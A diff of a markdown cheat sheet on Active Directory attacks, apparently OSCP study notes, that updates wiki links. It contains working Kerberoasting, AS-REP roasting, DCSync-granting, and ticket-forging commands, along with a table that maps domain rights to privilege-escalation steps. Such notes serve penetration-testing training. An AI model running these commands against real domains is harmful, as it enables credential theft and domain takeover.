@@ -6,7 +6,7 @@ tags:
   - acl-abuse
   - kerberos
 ---
-> *AD Attacks:* Turning a domain foothold into credentials and privilege. Kerberoasting, AS-REP roasting, password spraying, ACL/DACL abuse, and (after compromise) Kerberos ticket forging and trust abuse. Trigger: you have at least one domain credential, or a username list, or a BloodHound edge from something you own. Pairs with [[AD Enumeration]] (find the targets) and [[AD Lateral Movement and Persistence]] (use what you get).
+> *AD Attacks:* Turning a domain foothold into credentials and privilege. Kerberoasting, AS-REP roasting, password spraying, ACL/DACL abuse, and (after compromise) Kerberos ticket forging and trust abuse. Trigger: you have at least one domain credential, or a username list, or a BloodHound edge from something you own. Pairs with [[03D - AD Enumeration]] (find the targets) and [[03F - AD Lateral Movements & Persistence]] (use what you get).
 
 ## Kerberoasting
 
@@ -17,14 +17,14 @@ impacket-GetUserSPNs corp.com/user:pass -dc-ip $IP -request -outputfile kerb.has
 impacket-GetUserSPNs corp.com/user:pass -dc-ip $IP -request-user sqldev -outputfile sqldev.hash
 hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
 ```
-On a Windows foothold: `Rubeus.exe kerberoast /nowrap /outfile:kerb.hash` (see [[Rubeus]]).
+On a Windows foothold: `Rubeus.exe kerberoast /nowrap /outfile:kerb.hash` (see [[11B - Rubeus]]).
 
 > [!note]
-> If `GetUserSPNs` errors on clock skew, sync time: `sudo ntpdate $IP`. Cracked service-account passwords go straight back into [[Brute Forcing and Spraying]].
+> If `GetUserSPNs` errors on clock skew, sync time: `sudo ntpdate $IP`. Cracked service-account passwords go straight back into [[09B - Brute Forcing & Spraying]].
 
 ## AS-REP Roasting
 
-Accounts with "Do not require Kerberos preauthentication" hand out an encrypted blob to anyone who asks. You do not even need creds, just a username list (the `kerbrute` list from [[AD Enumeration]]).
+Accounts with "Do not require Kerberos preauthentication" hand out an encrypted blob to anyone who asks. You do not even need creds, just a username list (the `kerbrute` list from [[03D - AD Enumeration]]).
 
 ```bash
 impacket-GetNPUsers corp.com/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
@@ -64,32 +64,32 @@ net group "Target Group" user /add /domain                                  # Ad
 > Set-DomainObject -Identity victim -SET @{serviceprincipalname='fake/SPN'} -Credential $cred   # targeted Kerberoast via GenericWrite
 > Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity user -Rights DCSync -Credential $cred   # grant self DCSync via WriteDacl
 > ```
-> From Kali, [[BloodyAD]] does the same over LDAP with one consistent syntax.
+> From Kali, [[11C - BloodyAD]] does the same over LDAP with one consistent syntax.
 
 ### Rights & Privileges Decoder (see it → do this)
 
-| Right / privilege | Meaning → what you do |
-|---|---|
-| **SeImpersonate / SeAssignPrimaryToken** | Potato → SYSTEM ([[Windows Privilege Escalation]]) |
-| **SeBackup / SeRestore** | Read any file → copy SAM+SYSTEM (or NTDS) → secretsdump offline |
-| **SeDebug** | Access any process → dump LSASS for creds |
-| **SeLoadDriver** | Load a vulnerable driver → kernel-level SYSTEM |
-| **SeTakeOwnership** | Take ownership of a file/key → grant yourself write → modify |
-| **GenericAll (user)** | Full control → reset password, or set a fake SPN and Kerberoast |
-| **GenericAll (group)** | Add yourself to the group |
-| **GenericAll (computer)** | RBCD / read LAPS / shadow-credentials |
-| **GenericWrite (user)** | Set an SPN (targeted Kerberoast) or a logon script |
-| **WriteDACL** | Grant yourself rights on the object, e.g. add DCSync on the domain |
-| **WriteOwner** | Become owner → then WriteDACL → full control |
-| **ForceChangePassword** | Reset the target's password without the old one |
-| **AddMember** | Add an account to a group |
-| **ReadLAPSPassword / ReadGMSAPassword** | Read the managed local-admin / gMSA password directly |
-| **DnsAdmins membership** | Load a malicious DLL into the DNS service → SYSTEM on the DC |
-| **Backup Operators membership** | Gains SeBackup/SeRestore → read hives / NTDS |
-| **Exchange Windows Permissions** | Often WriteDACL on the domain → grant self DCSync |
+| Right / privilege                        | Meaning → what you do                                              |
+| ---------------------------------------- | ------------------------------------------------------------------ |
+| **SeImpersonate / SeAssignPrimaryToken** | Potato → SYSTEM ([[05C - Windows Privilege Escalation]])           |
+| **SeBackup / SeRestore**                 | Read any file → copy SAM+SYSTEM (or NTDS) → secretsdump offline    |
+| **SeDebug**                              | Access any process → dump LSASS for creds                          |
+| **SeLoadDriver**                         | Load a vulnerable driver → kernel-level SYSTEM                     |
+| **SeTakeOwnership**                      | Take ownership of a file/key → grant yourself write → modify       |
+| **GenericAll (user)**                    | Full control → reset password, or set a fake SPN and Kerberoast    |
+| **GenericAll (group)**                   | Add yourself to the group                                          |
+| **GenericAll (computer)**                | RBCD / read LAPS / shadow-credentials                              |
+| **GenericWrite (user)**                  | Set an SPN (targeted Kerberoast) or a logon script                 |
+| **WriteDACL**                            | Grant yourself rights on the object, e.g. add DCSync on the domain |
+| **WriteOwner**                           | Become owner → then WriteDACL → full control                       |
+| **ForceChangePassword**                  | Reset the target's password without the old one                    |
+| **AddMember**                            | Add an account to a group                                          |
+| **ReadLAPSPassword / ReadGMSAPassword**  | Read the managed local-admin / gMSA password directly              |
+| **DnsAdmins membership**                 | Load a malicious DLL into the DNS service → SYSTEM on the DC       |
+| **Backup Operators membership**          | Gains SeBackup/SeRestore → read hives / NTDS                       |
+| **Exchange Windows Permissions**         | Often WriteDACL on the domain → grant self DCSync                  |
 
 > [!note]
-> Highest-value chain: WriteDACL on the domain → grant `DS-Replication-Get-Changes-All` → DCSync ([[AD Lateral Movement and Persistence]]).
+> Highest-value chain: WriteDACL on the domain → grant `DS-Replication-Get-Changes-All` → DCSync ([[03F - AD Lateral Movements & Persistence]]).
 
 ## Kerberos Ticket Forging (Golden / Silver)
 
@@ -106,7 +106,7 @@ impacket-psexec corp.com/Administrator@<DC> -k -no-pass
 ```
 
 **Silver Ticket**
-Trigger: A service account or machine account hash. Forges a ticket for that one service on that one host, narrower but stealthier because it never contacts the DC. mimikatz/Rubeus forms in [[Rubeus]].
+Trigger: A service account or machine account hash. Forges a ticket for that one service on that one host, narrower but stealthier because it never contacts the DC. mimikatz/Rubeus forms in [[11B - Rubeus]].
 
 ## Domain Trusts (child → parent, cross-forest)
 
@@ -121,8 +121,8 @@ impacket-raiseChild corp.local/childadmin:'pass'@<child-DC>   # automated SID-hi
 
 ## See Also
 
-- [[AD Enumeration]] for finding SPNs, no-preauth accounts, and ACL edges
-- [[AD Lateral Movement and Persistence]] for DCSync and using the hashes
-- [[Rubeus]] and [[BloodyAD]] for driving the two tools this leans on
-- [[Hash Cracking]] for cracking roast output
-- Source: [[OSCP Field Manual]] sections 7.1, 7.4, 7.4.1
+- [[03D - AD Enumeration]] for finding SPNs, no-preauth accounts, and ACL edges
+- [[03F - AD Lateral Movements & Persistence]] for DCSync and using the hashes
+- [[11B - Rubeus]] and [[11C - BloodyAD]] for driving the two tools this leans on
+- [[09C - Hash Cracking]] for cracking roast output
+- Source: *OSCP Field Manual* sections 7.1, 7.4, 7.4.1
